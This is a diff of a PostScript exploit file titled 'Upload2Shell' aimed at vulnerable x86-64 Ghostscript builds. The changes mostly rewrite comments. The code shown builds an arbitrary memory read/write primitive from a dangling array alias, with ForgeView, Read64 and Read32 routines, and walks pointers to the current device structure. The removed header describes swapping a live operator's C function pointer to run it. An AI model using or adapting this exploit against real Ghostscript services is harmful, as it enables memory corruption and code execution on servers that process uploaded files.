@@ -1,6 +1,6 @@
 %!PS
-% Upload2Shell bounded native-memory proof for vulnerable x86-64 Ghostscript builds.
-% It swaps one live operator's C function pointer, executes it, and restores it.
+% Upload2Shell - stages 1 to 4, the read/write primitive and the pointer walk.
+% No command runs here; this one is for looking at the target's memory layout.
 
 true setglobal
 /FontPath (%ram%ghostescape-native-write.pfa) def
@@ -84,11 +84,11 @@ Dangling Offset 16#79 put
 } for
 ArrayIndex -1 eq { (NO_ALIAS\n) print quit } if
 
-% ================= Stage 1: arbitrary read/write + pointer walk =================
+% --- stage 1: read/write and the pointer walk ---
 /RefBase Offset 8 sub def
 /Template 8 string def
 
-/ForgeView { % addr -> string with rsize 0x7ffffff0 at addr
+/ForgeView { % ( addr -- string )  a string with rsize 0x7ffffff0 at addr
   /A exch def
   Victims ArrayIndex get Slot /Template load put
   Dangling RefBase 4 add 16#f0 put
@@ -102,7 +102,7 @@ ArrayIndex -1 eq { (NO_ALIAS\n) print quit } if
   Victims ArrayIndex get Slot get
 } def
 
-/Read64 { % addr -> int
+/Read64 { % ( addr -- int )
   /A exch def
   A ForgeView /S exch def
   /V 0 def
@@ -113,7 +113,7 @@ ArrayIndex -1 eq { (NO_ALIAS\n) print quit } if
   V
 } def
 
-/Read32 { % addr -> int
+/Read32 { % ( addr -- int )
   /A exch def
   A ForgeView /S exch def
   /V 0 def
@@ -124,7 +124,7 @@ ArrayIndex -1 eq { (NO_ALIAS\n) print quit } if
   V
 } def
 
-% currentdevice ref -> psi_device_ref*
+% dig out the psi_device_ref behind currentdevice
 Victims ArrayIndex get Slot currentdevice put
 /Pdev 0 def
 0 1 7 {
